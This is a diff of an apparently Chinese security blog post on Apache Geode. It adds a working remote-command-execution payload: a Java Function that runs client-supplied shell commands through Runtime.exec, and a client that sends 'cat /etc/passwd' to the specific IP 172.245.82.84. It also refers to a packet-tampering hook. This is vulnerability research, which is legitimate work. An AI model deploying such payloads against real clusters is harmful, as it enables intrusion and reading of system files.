@@ -396,6 +396,7 @@ iptables -A OUTPUT -j NFQUEUE --queue-num 0
 在使用 pip 安装完毕 netfilterqueue python 接口 package 后，在伪服务端运行以下代码
 
 ```py
+#by leeya_bug
 #写 TCP 抓包改包 hook 并运行
 from scapy.all import *
 import netfilterqueue
@@ -433,8 +434,9 @@ queue.run()
 用户可以通过手动上传一个按照 Geode 部署规则打包的 JAR 包的方式在集群上部署自己的函数，该函数的必须 implement org.apache.geode.cache.execute.Function 并且实现 execute 和 getId 方法，getId 方法返回值将作为 Function 的唯一标识符，如下所示  
 
 ```java
+//by leeya_bug
 public class TestFunction implements Function {
-  public static final String ID;
+  public static final String ID = "test123";
 
   @Override
   public String getId() {
@@ -514,6 +516,7 @@ git clone https://github.com/apache/geode-examples
 4. 打包完毕后，文件 `geode-examples/functions/build/libs/functions.jar` 即为我们即将植入集群的恶意类 JAR，稍后我们会使用 `../gradlew run` 来调用集群中植入的 JAR. 需要注意的是，读者可自行在任意 jdk 环境下构造客户端与集群通信，如下所示，并非一定要使用 `../gradlew run` 命令
 
     ```java
+    //by leeya_bug
     import java.util.HashSet;
     import java.util.List;
     import java.util.Set;
@@ -566,7 +569,7 @@ git clone https://github.com/apache/geode-examples
 
     在客户端上输入以上命令时，请完全忽略回显，由于一些集群底层架构问题，回显是错误的，一切以集群实际情况为准.  
 
-    Tip: 第 1、2 条命令的作用是创建一个可交互性 region，笔者打包的 functions.jar 需要名为 example-region 的 region 用作数据交互，第 3 条命令的作用是将 functions.jar 部署到集群中
+    Tip1: 第 1、2 条命令的作用是创建一个可交互性 region，笔者打包的 functions.jar 需要名为 example-region 的 region 用作数据交互，第 3 条命令的作用是将 functions.jar 部署到集群中
 
 2. 进入 `geode-examples/functions`，输入以下命令启动客户端调用远程函数  
 
@@ -579,6 +582,66 @@ git clone https://github.com/apache/geode-examples
 3. 登录集群，发现根目录 `/` 下果然存在文件 `/hacked.txt`，证明攻击者可将 Payload 植入到 JAR 并上传至集群，而后远程调用该 JAR，在集群中触发命令执行漏洞  
 
     ![avatar](/image/2024-06-01-11.png)  
+
+    请注意的是，位于第2点的 `create region` 和 `describe region` 命令完全是非必要的，客户端调用 execute 后也是可以返回回显的. 只是由于此处只是简单证明一下命令执行漏洞，因此笔者仅仅拉了 example 修改了一下便于验证.  
+
+    能够执行来自客户端发送的命令，并返回回显的示例 JAR 如下示例所示
+
+    ```java
+    //by leeya_bug
+    package org.example;
+    import org.apache.geode.cache.execute.*;
+    import java.io.*;
+
+    public class PayloadFunction1 implements Function {
+        public static final String ID = "leeyabug_example";
+        @Override
+        public void execute(FunctionContext context) {
+            try {
+                Object[] args = (Object[]) context.getArguments();
+                BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec((String) args[0]).getInputStream()));
+
+                String line;
+                StringBuilder output = new StringBuilder();
+                while ((line = reader.readLine()) != null) {
+                    output.append(line).append("\n");
+                }
+
+                context.getResultSender().lastResult(output.toString());
+            }catch (Exception e){
+                context.getResultSender().lastResult(e.getMessage());
+            }
+        }
+
+        @Override
+        public String getId() {
+            return this.ID;
+        }
+    }
+    ```
+
+    能够发送命令并打印回显的客户端示例如下所示
+
+    ```java
+    //by leeya_bug
+    package org.example;
+    import org.apache.geode.cache.client.*;
+    import org.apache.geode.cache.execute.*;
+
+    public class Client {
+        public static void main(String[] args)() {
+            ClientCache cache = new ClientCacheFactory().addPoolLocator("172.245.82.84", 10334).create();
+
+            Object[] functionArgs = new Object[]{"cat /etc/passwd"};
+            Execution execution = FunctionService.onServer(cache).setArguments(functionArgs);
+            ResultCollector<?, ?> rc = execution.execute("leeyabug_example");
+
+            Object result = rc.getResult();
+            System.out.println(result);
+            cache.close();
+        }
+    }
+    ```
 
 
 # [](#header-31)一些个人意见
@@ -593,6 +656,7 @@ git clone https://github.com/apache/geode-examples
 笔者学业繁忙，以上某些漏洞若想要达到 100% 复现率，需要花半把个月时间将整个 Geode 协议吃透，而本篇文章仅为学习用途，因此笔者无任何深入研究  Geode 协议并将其利益化的必要
 
 ![avatar](/image/2024-06-01-13.png)  
+`*一个可能的攻击路径`
 
 
 
